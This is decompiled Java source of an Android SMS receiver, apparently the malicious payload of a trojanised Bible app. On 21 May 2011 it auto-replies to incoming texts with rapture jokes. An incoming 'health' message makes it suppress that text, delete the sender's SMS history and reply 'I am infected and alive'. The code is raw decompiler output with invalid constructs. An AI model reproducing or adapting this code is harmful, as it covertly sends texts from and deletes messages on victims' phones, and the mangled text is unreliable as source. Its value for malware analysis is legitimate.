package com.YahwehOrNoWay;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

public class SMSsmack
  extends BroadcastReceiver
{
  private static final String TAG = "Message recieved";
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int i4 = 0;
    String str17 = "";
    Date localDate = new java/util/Date;
    localDate.<init>();
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    Object localObject5 = "MMddyyyy";
    Object localObject1 = localSimpleDateFormat;
    Object localObject2 = localObject5;
    ((SimpleDateFormat)localObject1).<init>((String)localObject2);
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localObject1 = localSimpleDateFormat;
    localObject2 = localDate;
    localObject5 = ((SimpleDateFormat)localObject1).format((Date)localObject2);
    localObject1 = localStringBuilder;
    localObject2 = localObject5;
    ((StringBuilder)localObject1).<init>((String)localObject2);
    String str13 = "/data/data/com.AmazingBullshit.HolyFuckingBible/databases/";
    String str12 = "mydb.db";
    String str14 = "myTable";
    try
    {
      localObject5 = new java/lang/StringBuilder;
      String str7 = String.valueOf(str13);
      ((StringBuilder)localObject5).<init>(str7);
      localObject5 = ((StringBuilder)localObject5).append(str12);
      String str16 = ((StringBuilder)localObject5).toString();
      localObject5 = null;
      int n = 1;
      localObject1 = str16;
      localObject2 = localObject5;
      int i = n;
      SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase((String)localObject1, (SQLiteDatabase.CursorFactory)localObject2, i);
      localObject5 = "select * from myTable";
      str8 = null;
      localObject1 = localSQLiteDatabase;
      localObject2 = localObject5;
      str1 = str8;
      Cursor localCursor1 = ((SQLiteDatabase)localObject1).rawQuery((String)localObject2, str1);
      localCursor1.moveToLast();
      int j = 0;
      str17 = localCursor1.getString(j);
      localCursor1.close();
      localSQLiteDatabase.close();
    }
    catch (Exception localException)
    {
      String str8;
      String str1;
      String str2;
      boolean bool1;
      String str3;
      boolean bool2;
      int k;
      String[] arrayOfString;
      Bundle localBundle;
      String str4;
      Object localObject10;
      int m;
      SmsMessage localSmsMessage;
      Random localRandom;
      int i5;
      String str15;
      String str5;
      boolean bool3;
      Object localObject4;
      Object localObject6;
      int i1;
      Object localObject8;
      int i3;
      String str10;
      Object localObject9;
      long l;
      String str11;
      Cursor localCursor2;
      boolean bool4;
      String str9;
      boolean bool5;
      String str6;
      for (;;) {}
    }
    str2 = "endoftheworld";
    localObject1 = str17;
    localObject2 = str2;
    bool1 = ((String)localObject1).matches((String)localObject2);
    if (bool1)
    {
      str3 = localStringBuilder.toString();
      str8 = "05212011";
      bool2 = str3.matches(str8);
      if (bool2)
      {
        k = 7;
        arrayOfString = new String[k];
        k = 0;
        str8 = "Cannot talk right now, the world is about to end";
        arrayOfString[k] = str8;
        k = 1;
        str8 = "Jebus is way over due for a come back";
        arrayOfString[k] = str8;
        k = 2;
        str8 = "Its the Raptures,praise Jebus";
        arrayOfString[k] = str8;
        k = 3;
        str8 = "Prepare to meet thy maker, make sure to hedge your bet just in case the Muslims were right";
        arrayOfString[k] = str8;
        k = 4;
        str8 = "Just saw the four horsemen of the apocalypse and man did they have the worst case of road rage";
        arrayOfString[k] = str8;
        k = 5;
        str8 = "Es el fin del mundo";
        arrayOfString[k] = str8;
        k = 6;
        str8 = "I am infected and alive ver 1.00";
        arrayOfString[k] = str8;
        localBundle = paramIntent.getExtras();
        str4 = "pdus";
        localObject1 = localBundle;
        localObject2 = str4;
        localObject10 = ((Bundle)localObject1).get((String)localObject2);
        localObject10 = (Object[])localObject10;
        m = 0;
        paramIntent = localObject10[m];
        paramIntent = (byte[])paramIntent;
        localSmsMessage = SmsMessage.createFromPdu(paramIntent);
        localRandom = new java/util/Random;
        localRandom.<init>();
        m = 4;
        localObject1 = localRandom;
        localObject2 = m;
        m = ((Random)localObject1).nextInt(localObject2);
        i5 = m + 1;
        str15 = localSmsMessage.getOriginatingAddress();
        str5 = localSmsMessage.getMessageBody();
        str8 = "health";
        bool3 = str5.matches(str8);
        if (bool3)
        {
          abortBroadcast();
          localObject4 = paramContext.getContentResolver();
          localObject6 = "content://sms/";
          localObject6 = Uri.parse((String)localObject6);
          i1 = 3;
          localObject8 = new String[i1];
          i3 = 0;
          str10 = "_id";
          localObject8[i3] = str10;
          i3 = 1;
          str10 = "thread_id";
          localObject8[i3] = str10;
          i3 = 2;
          str10 = "address";
          localObject8[i3] = str10;
          localObject9 = new java/lang/StringBuilder;
          str10 = "address=\"";
          ((StringBuilder)localObject9).<init>(str10);
          localObject9 = ((StringBuilder)localObject9).append(str15);
          str10 = "\"";
          localObject9 = ((StringBuilder)localObject9).append(str10);
          localObject9 = ((StringBuilder)localObject9).toString();
          str10 = null;
          l = localSmsMessage.getTimestampMillis();
          str11 = String.valueOf(l);
          localCursor2 = ((ContentResolver)localObject4).query((Uri)localObject6, (String[])localObject8, (String)localObject9, str10, str11);
          bool4 = localCursor2.moveToFirst();
          if (bool4) {
            do
            {
              Object localObject7 = new java/lang/StringBuilder;
              localObject8 = "content://sms/";
              ((StringBuilder)localObject7).<init>((String)localObject8);
              int i2 = 0;
              localObject1 = localCursor2;
              localObject2 = i2;
              str9 = ((Cursor)localObject1).getString(localObject2);
              localObject7 = ((StringBuilder)localObject7).append(str9);
              localObject7 = ((StringBuilder)localObject7).toString();
              Uri localUri = Uri.parse((String)localObject7);
              localObject7 = paramContext.getContentResolver();
              str9 = null;
              localObject9 = null;
              localObject1 = localObject7;
              localObject2 = localUri;
              str1 = str9;
              Object localObject3 = localObject9;
              ((ContentResolver)localObject1).delete((Uri)localObject2, str1, (String[])localObject3);
              bool5 = localCursor2.moveToNext();
            } while (bool5);
          }
          localCursor2.close();
          i5 = 6;
        }
        localObject4 = SmsManager.getDefault();
        str6 = localSmsMessage.getOriginatingAddress();
        str9 = null;
        localObject9 = arrayOfString[i5];
        str10 = null;
        str11 = null;
        ((SmsManager)localObject4).sendTextMessage(str6, str9, (String)localObject9, str10, str11);
      }
    }
  }
}

/* Location:
 * Qualified Name:     com.YahwehOrNoWay.SMSsmack
 * Java Class Version: 1.2 (46.0)
 * JD-Core Version:    0.7.1
 */